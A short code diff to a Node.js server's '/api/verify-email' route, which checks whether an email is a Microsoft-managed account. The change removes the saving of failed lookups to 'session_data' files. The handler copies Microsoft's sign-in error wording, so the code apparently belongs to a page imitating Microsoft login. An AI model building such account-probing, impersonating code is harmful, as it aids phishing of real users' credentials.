@@ -854,30 +854,7 @@ app.post('/api/verify-email', async (req, res) => {
                     console.log(`❌ Email verification failed for: ${email} - Account not found or not managed by Microsoft`);
                     console.log(`Discovery response:`, data);
 
-                    // Store invalid result
-                    const fs = require('fs');
-                    const path = require('path');
-                    const sessionDir = path.join(__dirname, 'session_data');
-                    if (!fs.existsSync(sessionDir)) {
-                        fs.mkdirSync(sessionDir, { recursive: true });
-                    }
-
-                    const invalidId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
-                    const invalidData = {
-                        id: invalidId,
-                        email: email,
-                        reason: 'Account not found',
-                        errorMessage: "We couldn't find an account with that username. Try another, or get a new Microsoft account.",
-                        timestamp: new Date().toISOString(),
-                        status: 'invalid',
-                        fullResponse: data
-                    };
-
-                    fs.writeFileSync(
-                        path.join(sessionDir, `invalid_${invalidId}.json`),
-                        JSON.stringify(invalidData, null, 2)
-                    );
-
+                    // Do not create files for account not found errors - just return response
                     res.json({
                         exists: false,
                         email: email,
